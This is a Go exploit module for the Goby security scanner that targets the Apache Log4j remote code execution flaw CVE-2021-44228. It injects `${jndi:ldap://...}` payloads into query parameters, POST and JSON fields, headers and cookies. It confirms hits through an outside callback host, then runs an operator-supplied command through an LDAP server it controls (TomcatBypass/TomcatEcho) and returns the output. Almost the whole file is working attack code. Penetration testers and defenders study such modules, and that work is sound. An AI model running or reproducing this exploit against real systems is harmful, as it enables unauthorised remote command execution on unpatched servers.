package exploits

import (
	"encoding/json"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"os"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Log4j < 2.15.0 RCE (CVE-2021-44228)",
    "Description": "Apache Log4j2 ",
    "Product": "Log4j",
    "Homepage": "https://logging.apache.org/log4j/2.x/",
    "DisclosureDate": "2021-12-09",
    "Author": "go0p",
    "GobyQuery": "url_hostinfo !=\"\"",
    "Level": "3",
    "Impact": "Apache Log4j2 ",
    "Recommendation": "In previous releases (&gt;=2.10) this behavior can be mitigated by setting system property \"log4j2.formatMsgNoLookups\" to “true” or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against RCE by defaulting \"com.sun.jndi.rmi.object.trustURLCodebase\" and \"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\".",
    "References": [
        "http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html",
        "http://www.openwall.com/lists/oss-security/2021/12/10/1",
        "https://nosec.org/home/detail/4917.html"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "cmd",
            "Type": "input",
            "Value": "whoami"
        }
    ],
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": null,
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": null,
        "Support": [
            "log4j"
        ],
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "PocId": "10243"
}`
	sendPayload := func(hostinfo *httpclient.FixUrl, urlObj *url.URL, payload string, cmd string) (string, error) {
		var allResponse string
		// 注入到query参数
		for k, _ := range urlObj.Query() {
			u2 := new(url.URL)
			*u2 = *urlObj
			values := u2.Query()
			values.Set(k, payload)
			u2.RawQuery = values.Encode()
			if u2.Path == "" {
				u2.Path = "/"
			}
			cfg := httpclient.NewGetRequestConfig(u2.Path + "?" + u2.RawQuery)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15;"+payload)
			cfg.Header.Store("X-Originating-IP", "127.0.0.1;"+payload)
			cfg.Header.Store("X-Forwarded-For", "127.0.0.1;"+payload)
			cfg.Header.Store("X-Remote-IP", "127.0.0.1;"+payload)
			cfg.Header.Store("X-Remote-Addr", "127.0.0.1;"+payload)
			cfg.Header.Store("Cookie", fmt.Sprintf("JSESSIONNID=%s;token=%s", payload, payload))
			if len(cmd) > 0 {
				cfg.Header.Store("cmd", cmd)
			}
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
				allResponse += resp.RawBody + "\n"
			}
		}

		// 注入到POST数据
		if strings.ToUpper(hostinfo.Method) == "POST" {
			urlPath := urlObj.Path
			if urlPath == "" {
				urlPath = "/"
			}
			if len(urlObj.RawQuery) > 0 {
				urlPath = urlPath + "?" + urlObj.RawQuery
			}
			cfg := httpclient.NewRequestConfig("POST", urlPath)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15;"+payload)
			cfg.Header.Store("X-Originating-IP", "127.0.0.1;"+payload)
			cfg.Header.Store("X-Forwarded-For", "127.0.0.1;"+payload)
			cfg.Header.Store("X-Remote-IP", "127.0.0.1;"+payload)
			cfg.Header.Store("X-Remote-Addr", "127.0.0.1;"+payload)
			cfg.Header.Store("Cookie", fmt.Sprintf("JSESSIONNID=%s;token=%s", payload, payload))
			if len(cmd) > 0 {
				cfg.Header.Store("cmd", cmd)
			}
			if hostinfo.PostDataType == "application/json" || strings.HasPrefix(hostinfo.Data, "{") { // JSON格式的数据
				cfg.Header.Store("Content-Type", "application/json")
				var jsonObj map[string]interface{}
				err := json.Unmarshal([]byte(hostinfo.Data), &jsonObj)
				if err == nil {
					for k, v := range jsonObj {
						_, ok := v.(string)
						if !ok {
							continue
						}
						jsonObj[k] = payload

						mData, err := json.Marshal(jsonObj)
						if err != nil {
							continue
						}
						cfg.Data = string(mData)

						if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
							allResponse += resp.RawBody + "\n"
						}
					}
				}
			} else { // 解析query格式的post数据
				// else if hostinfo.PostDataType == "application/x-www-form-urlencoded" {
				values, err := url.ParseQuery(hostinfo.Data)
				if err != nil {
					fmt.Println(err)
					return allResponse, err
				}
				for k, _ := range values {
					values2, _ := url.ParseQuery(hostinfo.Data)
					values2.Set(k, payload)
					cfg.Data = values2.Encode()
					if resp, err := httpclient.DoHttpRequest(hostinfo, cfg); err == nil {
						allResponse += resp.RawBody + "\n"
					}
				}
			}
		}
		return allResponse, nil
	}
	in := func(target string, items []string) bool {
		for _, eachItem := range items {
			if strings.Contains(target, eachItem) {
				return true
			}
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			if len(checkUrl) == 0 {
				return false
			}
			log.Println("222222: ", hostinfo.String())
			blackList := []string{
				".exe", ".gif", ".jpg", ".jpeg", ".bmp", ".js", ".css", ".png", ".less ", ".less ",
				".sass ", ".scss", ".svg", ".ttf", ".eot", ".woff", ".woff2", ".zip", ".tat", ".ico", ".swf", ".apk",
				".ts", ".m3u8", ".txt", ".mp3", ".mp4", ".avi", ".flv", ".wma", ".wmv", ".ogg", ".pdf",
				".ppt", ".xls", ".doc", ".docx", ".pptx",
			}
			if in(hostinfo.String(), blackList) {
				fmt.Println("静态文件")
				return false
			}
			urlObj, err := url.Parse(hostinfo.String())
			if err != nil {
				return false
			}
			if urlObj.Path == "" {
				urlObj.Path = "/"
			}
			fmt.Printf("%#v\n", hostinfo)
			payload := fmt.Sprintf(`${jndi:ldap://%s}`, checkUrl)
			sendPayload(hostinfo, urlObj, payload, "")
			ret := godclient.PullExists(checkStr, time.Second*15)
			err = os.MkdirAll("./data/log4j", os.ModePerm)
			if err != nil {
				fmt.Println(err)
			}
			if ret {
				fi, err := os.OpenFile(fmt.Sprintf("./data/log4j/log4jxx-%s-%s", hostinfo.IP, hostinfo.Port), os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
				if err == nil {
					defer fi.Close()
					fi.Write([]byte(hostinfo.Method + "\n"))
					fi.Write([]byte(urlObj.Path + "\n"))
					fi.Write([]byte(urlObj.RawQuery + "\n"))
					fi.Write([]byte(hostinfo.PostDataType + "\n"))
					fi.Write([]byte(hostinfo.Data + "\n"))
				} else {
					fmt.Println("openfile err:", err)
				}
				stepLogs.VulURL = hostinfo.String()
				stepLogs.KeyMemo = hostinfo.String()
				return true
			} else {
				return false
			}
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			hostInfo := expResult.HostInfo
			data, err := os.ReadFile(fmt.Sprintf("./data/log4j/log4jxx-%s-%s", expResult.HostInfo.IP, expResult.HostInfo.Port))
			if err == nil {
				fromPoC := string(data)
				parts := strings.Split(fromPoC, "\n")
				if len(parts) >= 5 {
					u, _ := url.Parse(expResult.HostInfo.String())
					u.Path = parts[1]
					u.RawQuery = parts[2]
					hostInfo = httpclient.NewFixUrl(u.String())

					hostInfo.Method = parts[0]
					hostInfo.PostDataType = parts[3]
					hostInfo.Data = parts[4]
				}
			}
			urlObj, err := url.Parse(hostInfo.String())
			if err != nil {
				fmt.Println("url parse err: ", err)
				return expResult
			}
			cmd := stepLogs.Params["cmd"].(string)
			//payload :=fmt.Sprintf("${jndi:ldap://%s:1389/Deserialization/CommonsCollectionsK1/TomcatEcho}",godclient.GetGodServerHost())
			payload := fmt.Sprintf("${jndi:ldap://%s:1389/TomcatBypass/TomcatEcho}", godclient.GetGodServerHost())
			allResponse, _ := sendPayload(hostInfo, urlObj, payload, cmd)
			expResult.Success = true
			expResult.Output = allResponse
			return expResult
		},
		//nil,
	))
}
